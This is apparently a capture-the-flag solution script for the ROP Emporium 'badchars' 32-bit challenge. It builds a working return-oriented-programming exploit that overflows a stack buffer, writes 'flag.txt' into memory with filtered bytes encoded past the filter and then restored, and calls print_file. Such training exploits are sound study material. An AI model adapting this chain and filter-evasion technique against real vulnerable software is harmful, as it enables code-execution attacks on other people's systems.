#!/usr/bin/python
import sys
import struct

# run < <(python challenge.py)
# need to write flag.txt into memory, and call print_file.

# 0x080483d0  print_file@plt

# ROPgadget --binary badchars32
# 0x0804854f  mov DWORD PTR [edi],esi; ret
# 0x080485b9 : pop esi ; pop edi ; pop ebp ; ret

# where to write my payload...
# need a read/write mapping, like this:
# gdb -> info proc mappings
# 0x0804a000 0x0804b000 0x1000     0x1000     rw-p  /root/tools/rop-emporium/badchars/badchars32 
# a more granular view at the maps:
# gdb -> maintenance info sections
#  [22]     0x804a000->0x804a018 at 0x00001000: .got.plt ALLOC LOAD DATA HAS_CONTENTS
#  [23]     0x804a018->0x804a020 at 0x00001018: .data ALLOC LOAD DATA HAS_CONTENTS
#  [24]     0x804a020->0x804a024 at 0x00001020: .bss ALLOC
# Althrough the .bss segment shows only 4 bytes here, the kernel will map
# the entire page (4096 bytes), giving me a good amount of space to write my data.

# badchars filtering coming into play!
# breakpoint at ret of pwnme
# x/20wx $esp
# 0xffffd28c:     0x080485b9      0xebeb6c66      0x0804a050      0xdeadc0de
# 0xffffd29c:     0x0804854f      0x080485b9      0x74eb74eb      0x0804a054
# 0xffffd2ac:     0xdeadc0de      0x0804854f      0x080485b9      0x6c6f6c00
# 0xffffd2bc:     0x0804a058      0xdeadc0de      0x0804854f      0x0804a014
# 0xffffd2cc:     0xdeadc0de      0x0804a050      0x08048560      0xf7ffcb60

# 0xebeb6c66 -- instead of 'flag', I get fl\xeb\xeb. they are filtered before I hijack control flow.
# In ghidra disassembly, here is the badchars filtering at work
"""
  nBytesRead = read(0,userbuf,0x200);
  for (i = 0; i < nBytesRead; i = i + 1) {
    for (j = 0; j < 4; j = j + 1) {
      if (userbuf[i] == "xga.badchars by ROP Emporium"[j]) {
        userbuf[i] = -0x15;
      }
    }
  }
"""

payload_locations = [
    b'\x50\xa0\x04\x08',
    b'\x54\xa0\x04\x08',
    b'\x58\xa0\x04\x08'
]

transformed = []
deadcode   = b'\xde\xc0\xad\xde'

def write_what_where_sanitize(data, addr):
    """
        4-byte write primitive using the following gadgets:
        0x0804854f  mov DWORD PTR [edi],esi; ret
        0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
    """

    """
        I can also control ebx with this gadget...
        0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret

        And I can modify data at the address of ebp.
           0x08048543  add    BYTE PTR [ebp+0x0],bl ; ret
           0x08048547  xor    BYTE PTR [ebp+0x0],bl ; ret
           0x0804854b  sub    BYTE PTR [ebp+0x0],bl ; ret
    """

    if len(data) != 4:
        raise Exception("data length must be 4")

    ## Modify data prior to writing it to the stack
    print(f"Original data: {data}")
    data_sanitized = sanitize(data, addr)

    print(f"Writing sanitized data: {data_sanitized}")

    pop_esi_pop_edi_pop_ebp_ret = b'\xb9\x85\x04\x08'
    mov_dword_ptr_edi_esi       = b'\x4f\x85\x04\x08'
    deadcode = b'\xde\xc0\xad\xde'

    # jump to pop/pop/pop/ret gadget; set up registers for mov call; ret to mov call
    payload = pop_esi_pop_edi_pop_ebp_ret + \
            data_sanitized + \
            addr + \
            deadcode + \
            mov_dword_ptr_edi_esi

    return payload

def sanitize(data, start_addr):
    """
        Iterate over data at start_addr,
        Transform characters as needed (by adding one)
        And keep track of the address of each of the
        transformed characters.
    """
    badchars    = ['x', 'g', 'a', '.']
    new_bytes   = b''

    for idx, c in enumerate(data):
        if chr(c) in badchars:

            # Add one to the byte to evade the filtering
            # Store the address where the modified data is
            modified_addr = struct.pack("<I", (struct.unpack("<I", start_addr)[0] + idx))
            print(f"Modified data at {modified_addr.hex()})")
            transformed.append(modified_addr)

            new_bytes += bytes([(c+1)])
        else:
            new_bytes += bytes([c])

    return new_bytes

def patch_byte(addr):
    """
        to get around filtering, will add one to each of the badchars if they appear in the string.
        thus, if we see a character which is (badchar+1),
        we know it needs to be transformed back by subtracting one.

        gadget to subtract one from a byte:
        0x0804854b : sub byte ptr [ebp], bl ; ret

        can control ebp and bl with this gadget:
        0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
    """
    pop_ebx_pop_esi_pop_edi_pop_ebp_ret = b'\xb8\x85\x04\x08'
    sub_byte_ptr_ebp_bl_ret             = b'\x4b\x85\x04\x08'

    print(f"Transforming data at {addr.hex()}")

    """ jump to pop/pop/pop/pop/ret gadget;
        set up registers for sub call;
        ret to sub call
    """
    payload = pop_ebx_pop_esi_pop_edi_pop_ebp_ret + \
            b'\x01AA\x01' + \
            deadcode + \
            deadcode + \
            addr + \
            sub_byte_ptr_ebp_bl_ret

    return payload

flag_str   = b'flag'
dot_txt    = b'.txt'
null_bytes = b'\x00lol' # to terminate the string

#print_file = b'\x14\xa0\x04\x08'
print_file = b'\xd0\x83\x04\x08' # 0x080483d0
deadcode   = b'\xde\xc0\xad\xde'

payload = b'A'*40
payload += b'B'*4                # ebp

## write data to memory in sanitized form
payload += write_what_where_sanitize(flag_str, payload_locations[0])
payload += write_what_where_sanitize(dot_txt, payload_locations[1])
payload += write_what_where_sanitize(null_bytes, payload_locations[2])

# rop to modify bytes as necessary
for addr in transformed:
    payload += patch_byte(addr)

payload += print_file            # function to exec
payload += deadcode              # return for print_file
payload += payload_locations[0]  # argument for print_file

sys.stdout.buffer.write(payload)
